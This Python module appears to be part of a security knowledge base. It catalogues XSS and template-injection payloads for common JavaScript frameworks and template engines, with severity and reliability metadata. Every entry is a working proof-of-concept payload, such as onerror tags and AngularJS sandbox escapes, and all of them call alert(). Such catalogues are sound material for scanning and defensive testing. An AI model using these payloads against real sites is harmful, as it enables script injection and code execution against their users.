#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created

Framework-specific XSS Payloads
Covers React, Vue, Angular, jQuery, Backbone, Ember, Svelte
"""

from ..models import PayloadEntry


FRAMEWORK_PAYLOAD_DATABASE = {
    # ===== REACT XSS =====
    "react_dangerously_001": PayloadEntry(
        payload='<div dangerouslySetInnerHTML={{__html:"<img src=x onerror=alert(1)>"}}></div>',
        contexts=["html_content"],
        tags=["react", "dangerouslysetinnerhtml"],
        severity="high",
        cvss_score=7.5,
        description="React dangerouslySetInnerHTML XSS",
        reliability="high",
    ),
    "react_href_001": PayloadEntry(
        payload="javascript:alert(document.domain)",
        contexts=["href"],
        tags=["react", "href", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="React href javascript protocol",
        reliability="high",
    ),
    "react_ssr_001": PayloadEntry(
        payload="</script><script>alert(1)</script>",
        contexts=["javascript"],
        tags=["react", "ssr", "nextjs"],
        severity="high",
        cvss_score=7.5,
        description="React SSR script injection",
        reliability="medium",
    ),
    # ===== VUE XSS =====
    "vue_vhtml_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        tags=["vue", "v-html"],
        severity="high",
        cvss_score=7.5,
        description="Vue v-html directive XSS",
        reliability="high",
    ),
    "vue_template_001": PayloadEntry(
        payload='{{_c.constructor("alert(1)")()}}',
        contexts=["template"],
        tags=["vue", "template", "ssti"],
        severity="critical",
        cvss_score=9.0,
        description="Vue 2 template injection",
        reliability="medium",
    ),
    # ===== ANGULAR XSS =====
    "angular_bypass_001": PayloadEntry(
        payload='{{constructor.constructor("alert(1)")()}}',
        contexts=["template"],
        tags=["angular", "angularjs", "ssti"],
        severity="critical",
        cvss_score=9.0,
        description="AngularJS sandbox escape",
        reliability="high",
    ),
    "angular_bypass_002": PayloadEntry(
        payload='{{"a]".constructor.prototype.charAt=[].join;$eval("x]alert(1)//")}}',
        contexts=["template"],
        tags=["angular", "angularjs", "sandbox"],
        severity="critical",
        cvss_score=9.0,
        description="AngularJS 1.x sandbox bypass",
        reliability="medium",
    ),
    "angular_bypass_003": PayloadEntry(
        payload='{{$on.constructor("alert(1)")()}}',
        contexts=["template"],
        tags=["angular", "angularjs"],
        severity="critical",
        cvss_score=9.0,
        description="AngularJS $on bypass",
        reliability="medium",
    ),
    # ===== JQUERY XSS =====
    "jquery_html_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content", "dom_xss"],
        tags=["jquery", "html"],
        severity="high",
        cvss_score=7.5,
        description="jQuery .html() XSS",
        reliability="high",
    ),
    "jquery_selector_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content", "dom_xss"],
        tags=["jquery", "selector"],
        severity="high",
        cvss_score=7.5,
        description="jQuery selector XSS $('<payload>')",
        reliability="high",
    ),
    # ===== EMBER XSS =====
    "ember_htmlsafe_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        tags=["ember", "htmlsafe"],
        severity="high",
        cvss_score=7.5,
        description="Ember htmlSafe() XSS",
        reliability="high",
    ),
    # ===== SVELTE XSS =====
    "svelte_html_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        tags=["svelte", "@html"],
        severity="high",
        cvss_score=7.5,
        description="Svelte @html directive XSS",
        reliability="high",
    ),
    # ===== HANDLEBARS XSS =====
    "handlebars_html_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content", "template"],
        tags=["handlebars", "triple-stash"],
        severity="high",
        cvss_score=7.5,
        description="Handlebars {{{unescaped}}} XSS",
        reliability="high",
    ),
    "handlebars_helper_001": PayloadEntry(
        payload='{{lookup (lookup this "constructor") "prototype"}}',
        contexts=["template"],
        tags=["handlebars", "prototype"],
        severity="critical",
        cvss_score=9.0,
        description="Handlebars prototype pollution",
        reliability="medium",
    ),
    # ===== EJS XSS =====
    "ejs_unescaped_001": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content", "template"],
        tags=["ejs", "unescaped"],
        severity="high",
        cvss_score=7.5,
        description="EJS <%- unescaped %> XSS",
        reliability="high",
    ),
    # ===== PUG/JADE XSS =====
    "pug_unescaped_001": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["html_content", "template"],
        tags=["pug", "jade", "unescaped"],
        severity="high",
        cvss_score=7.5,
        description="Pug != unescaped XSS",
        reliability="high",
    ),
    # ===== LODASH XSS =====
    "lodash_template_001": PayloadEntry(
        payload='<%= constructor.constructor("alert(1)")() %>',
        contexts=["template"],
        tags=["lodash", "template", "rce"],
        severity="critical",
        cvss_score=9.5,
        description="Lodash template RCE",
        reliability="medium",
    ),
}

FRAMEWORK_TOTAL_PAYLOADS = len(FRAMEWORK_PAYLOAD_DATABASE)
